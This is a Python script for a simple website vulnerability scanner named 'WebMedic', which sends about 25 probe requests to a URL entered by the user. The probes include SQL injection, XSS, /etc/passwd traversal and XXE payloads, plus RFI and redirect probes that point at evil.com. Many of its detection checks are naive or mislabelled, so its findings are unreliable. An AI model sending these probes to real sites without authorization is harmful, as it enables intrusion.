import requests
from bs4 import BeautifulSoup
import time
import os
import signal
import sys
from colorama import init, Fore, Style
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress only InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ANSI escape sequences for color formatting with colorama
RED = Fore.RED
LIGHT_RED = Fore.LIGHTRED_EX
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
GREEN = Fore.GREEN
RESET = Style.RESET_ALL
FLASH = '\033[5m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii_art():
    ascii_art = """

        ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀     ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  
        ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒
        ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒
        ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄      ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  
        ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒
         ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒   ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░
         ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░   ░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░
         ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░    ░  ░  ░    ░        ░   ▒     ░░   ░ 
           ░          ░  ░   ░     ░  ░            ░                 ░  ░   ░     
         ░                                                                        
                                                                    
– 𝙰𝚗𝚍 𝚝𝚘 𝙰𝚕𝚕𝚊𝚑 𝚋𝚎𝚕𝚘𝚗𝚐𝚜 𝚝𝚑𝚎 𝚔𝚒𝚗𝚐𝚍𝚘𝚖 𝚘𝚏 𝚝𝚑𝚎 𝚑𝚎𝚊𝚟𝚎𝚗𝚜 𝚊𝚗𝚍 𝚝𝚑𝚎 𝚎𝚊𝚛𝚝𝚑. 𝙰𝚗𝚍 𝙰𝚕𝚕𝚊𝚑 𝚑𝚊𝚜 𝚙𝚘𝚠𝚎𝚛 𝚘𝚟𝚎𝚛 𝚊𝚕𝚕 𝚝𝚑𝚒𝚗𝚐𝚜 –
                                ✷ 𝙰𝚕-𝚀𝚞𝚛𝚊𝚗: 3:189 ✷

♦ 𝚃𝚘𝚘𝚕 𝙽𝚊𝚖𝚎: ★彡[ᴡᴇʙᴍᴇᴅɪᴄ]彡★
♦ 𝚃𝚘𝚘𝚕 𝚃𝚢𝚙𝚎: 𝑾𝒆𝒃𝒔𝒊𝒕𝒆 𝑽𝒖𝒍𝒏𝒆𝒓𝒂𝒃𝒊𝒍𝒊𝒕𝒚 𝑺𝒄𝒂𝒏𝒏𝒆𝒓
♦ 𝚃𝚘𝚘𝚕 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 0.1 (Pre-Alpha)
♦ 𝚃𝚘𝚘𝚕 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝑫𝒂𝒓𝒌 𝑺𝒕𝒂𝒓

[ ⚠ 𝘾𝘼𝙐𝙏𝙄𝙊𝙉𝙎 ⚠ ]
● 𝙾𝚋𝚝𝚊𝚒𝚗 𝚙𝚛𝚘𝚙𝚎𝚛 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚊𝚝𝚒𝚘𝚗 𝚋𝚎𝚏𝚘𝚛𝚎 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚒𝚜 𝚝𝚘𝚘𝚕.
● 𝚄𝚜𝚎 𝚘𝚗 𝚜𝚢𝚜𝚝𝚎𝚖𝚜/𝚗𝚎𝚝𝚠𝚘𝚛𝚔𝚜 𝚢𝚘𝚞 𝚘𝚠𝚗 𝚘𝚛 𝚑𝚊𝚟𝚎 𝚎𝚡𝚙𝚕𝚒𝚌𝚒𝚝 𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗.
● 𝚄𝚗𝚍𝚎𝚛𝚜𝚝𝚊𝚗𝚍 𝚕𝚎𝚐𝚊𝚕 𝚒𝚖𝚙𝚕𝚒𝚌𝚊𝚝𝚒𝚘𝚗𝚜 𝚘𝚏 𝚜𝚎𝚌𝚞𝚛𝚒𝚝𝚢 𝚝𝚎𝚜𝚝𝚒𝚗𝚐 𝚝𝚘𝚘𝚕𝚜.
● 𝙳𝚘 𝚗𝚘𝚝 𝚞𝚜𝚎 𝚏𝚘𝚛 𝚖𝚊𝚕𝚒𝚌𝚒𝚘𝚞𝚜 𝚙𝚞𝚛𝚙𝚘𝚜𝚎𝚜 𝚘𝚛 𝚠𝚒𝚝𝚑𝚘𝚞𝚝 𝚌𝚘𝚗𝚜𝚎𝚗𝚝.
● 𝚁𝚎𝚜𝚙𝚎𝚌𝚝 𝚝𝚑𝚎 𝚜𝚎𝚌𝚞𝚛𝚒𝚝𝚢 𝚊𝚗𝚍 𝚙𝚛𝚒𝚟𝚊𝚌𝚢 𝚘𝚏 𝚘𝚝𝚑𝚎𝚛𝚜.
"""
    print(Fore.YELLOW + ascii_art)

    

class VulnerabilityScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities = []

    def fetch_page(self, url):
        try:
            response = requests.get(url, verify=False)
            response.raise_for_status()
            return response.text
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")
            return None

    def scan_sql_injection(self, url):
        payloads = ["' OR '1'='1", "' OR '1'='2"]
        for payload in payloads:
            test_url = f"{url}?search={payload}"
            response = self.fetch_page(test_url)
            if response and "error" in response:
                self.vulnerabilities.append(f"{url} - Possible SQL Injection")

    def scan_xss(self, url):
        payload = "<script>alert('XSS')</script>"
        test_url = f"{url}?search={payload}"
        response = self.fetch_page(test_url)
        if response and "alert" in response:
            self.vulnerabilities.append(f"{url} - Possible XSS")

    def scan_path_traversal(self, url):
        payload = f"{url}?file=../../../../etc/passwd"
        response = self.fetch_page(payload)
        if response and "root:" in response:
            self.vulnerabilities.append(f"{url} - Possible Path Traversal")

    def scan_directory_listing(self, url):
        payload = f"{url}/index.php?dir=../"
        response = self.fetch_page(payload)
        if response and "index of" in response.lower():
            self.vulnerabilities.append(f"{url} - Possible Directory Listing")

    def scan_command_injection(self, url):
        payload = f"{url}?command=ls"
        response = self.fetch_page(payload)
        if response and "bin" in response:
            self.vulnerabilities.append(f"{url} - Possible Command Injection")

    def scan_lfi(self, url):
        payload = f"{url}?file=../../../../etc/passwd"
        response = self.fetch_page(payload)
        if response and "root:" in response:
            self.vulnerabilities.append(f"{url} - Possible Local File Inclusion")

    def scan_rfi(self, url):
        payload = f"{url}?file=http://evil.com/malicious_file"
        response = self.fetch_page(payload)
        if response and "malicious" in response:
            self.vulnerabilities.append(f"{url} - Possible Remote File Inclusion")

    def scan_file_upload(self, url):
        payload = {'file': ('test.jpg', 'test content')}
        try:
            response = requests.post(url, files=payload, verify=False)
            if response.status_code == 200 and "success" in response.text:
                self.vulnerabilities.append(f"{url} - Possible Unrestricted File Upload")
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")

    def scan_open_redirect(self, url):
        payload = f"{url}?redirect=http://evil.com"
        response = self.fetch_page(payload)
        if response and "evil.com" in response:
            self.vulnerabilities.append(f"{url} - Possible Open Redirect")

    def scan_csrf(self, url):
        payload = f"{url}?action=transfer&amount=1000"
        response = self.fetch_page(payload)
        if response and "success" in response:
            self.vulnerabilities.append(f"{url} - Possible CSRF")

    def scan_crlf(self, url):
        payload = f"{url}?header=%0d%0aSet-Cookie: test=1"
        response = self.fetch_page(payload)
        if response and "test=1" in response:
            self.vulnerabilities.append(f"{url} - Possible CRLF Injection")

    def scan_csti(self, url):
        payload = f"{url}?file=../../../../../../etc/passwd"
        response = self.fetch_page(payload)
        if response and "root:" in response:
            self.vulnerabilities.append(f"{url} - Possible CSTI")

    def scan_ssrf(self, url):
        payload = f"{url}?url=http://localhost:9200"
        response = self.fetch_page(payload)
        if response and "localhost" in response:
            self.vulnerabilities.append(f"{url} - Possible SSRF")

    def scan_xxe(self, url):
        payload = "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <foo>&xxe;</foo>"
        test_url = f"{url}?data={payload}"
        response = self.fetch_page(test_url)
        if response and "root:" in response:
            self.vulnerabilities.append(f"{url} - Possible XXE")

    def scan_ssti(self, url):
        payload = f"{url}?input={{7*7}}"
        response = self.fetch_page(payload)
        if response and "49" in response:
            self.vulnerabilities.append(f"{url} - Possible SSTI")

    def scan_insecure_deserialization(self, url):
        payload = f"{url}?data=eyJzdGFydCI6IlRoaXMgYXJlIGEgdGVzdCI="
        response = self.fetch_page(payload)
        if response and "test" in response:
            self.vulnerabilities.append(f"{url} - Possible Insecure Deserialization")

    def scan_http_header_injection(self, url):
        payload = f"{url}?header=param1,value1&header=param2,value2"
        response = self.fetch_page(payload)
        if response and "value2" in response:
            self.vulnerabilities.append(f"{url} - Possible HTTP Header Injection")

    def scan_subdomain_takeover(self, url):
        payload = f"{url}?subdomain=www.example.com"
        response = self.fetch_page(payload)
        if response and "example.com" in response:
            self.vulnerabilities.append(f"{url} - Possible Subdomain Takeover")

    def scan_host_header_injection(self, url):
        payload = f"{url}?header=Host: evil.com"
        response = self.fetch_page(payload)
        if response and "evil.com" in response:
            self.vulnerabilities.append(f"{url} - Possible Host Header Injection")

    def scan_http_parameter_pollution(self, url):
        payload = f"{url}?param1=value1&param2=value2&param2=value3"
        response = self.fetch_page(payload)
        if response and "value3" in response:
            self.vulnerabilities.append(f"{url} - Possible HTTP Parameter Pollution")

    def scan_clickjacking(self, url):
        payload = f"{url}?frame=1"
        response = self.fetch_page(payload)
        if response and "frame" in response:
            self.vulnerabilities.append(f"{url} - Possible Clickjacking")

    def scan_insecure_cors(self, url):
        payload = f"{url}?cors=true"
        response = self.fetch_page(payload)
        if response and "cors" in response:
            self.vulnerabilities.append(f"{url} - Possible Insecure CORS")

    def scan_sensitive_data_exposure(self, url):
        payload = f"{url}?data=sensitive"
        response = self.fetch_page(payload)
        if response and "sensitive" in response:
            self.vulnerabilities.append(f"{url} - Possible Sensitive Data Exposure")

    def scan_unrestricted_file_upload(self, url):
        payload = {'file': ('test.jpg', 'test content')}
        try:
            response = requests.post(url, files=payload, verify=False)
            if response.status_code == 200 and "success" in response.text:
                self.vulnerabilities.append(f"{url} - Possible Unrestricted File Upload")
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")

    def scan_http_verb_tampering(self, url):
        try:
            response = requests.request("PUT", url, verify=False)
            if response.status_code == 200:
                self.vulnerabilities.append(f"{url} - Possible HTTP Verb Tampering")
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")

    def start_scan(self):
        clear_screen()
        print_ascii_art()
        url = input("Website URL: ").strip()
        total_vulnerabilities = 0
        scan_methods = [
            self.scan_sql_injection,
            self.scan_xss,
            self.scan_path_traversal,
            self.scan_directory_listing,
            self.scan_command_injection,
            self.scan_lfi,
            self.scan_rfi,
            self.scan_file_upload,
            self.scan_open_redirect,
            self.scan_csrf,
            self.scan_crlf,
            self.scan_csti,
            self.scan_ssrf,
            self.scan_xxe,
            self.scan_ssti,
            self.scan_insecure_deserialization,
            self.scan_http_header_injection,
            self.scan_subdomain_takeover,
            self.scan_host_header_injection,
            self.scan_http_parameter_pollution,
            self.scan_clickjacking,
            self.scan_insecure_cors,
            self.scan_sensitive_data_exposure,
            self.scan_unrestricted_file_upload,
            self.scan_http_verb_tampering
        ]
        total_vulnerabilities = len(scan_methods)
        start_time = time.time()

        try:
            for method in scan_methods:
                print(f"{FLASH}{RED}Scanning website for vulnerabilities ({len(self.vulnerabilities)}/{total_vulnerabilities}){RESET}", end='\r')
                method(url)
            end_time = time.time()
            total_time = end_time - start_time
            print(f"\n{GREEN}Expected Vulnerabilities of the {url}")
            print(f"Total time: {total_time:.2f} seconds")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. {LIGHT_RED}{vuln}{RESET}")
        except KeyboardInterrupt:
            print("\nScan interrupted by user.")

if __name__ == "__main__":
    scanner = VulnerabilityScanner("")
    scanner.start_scan()
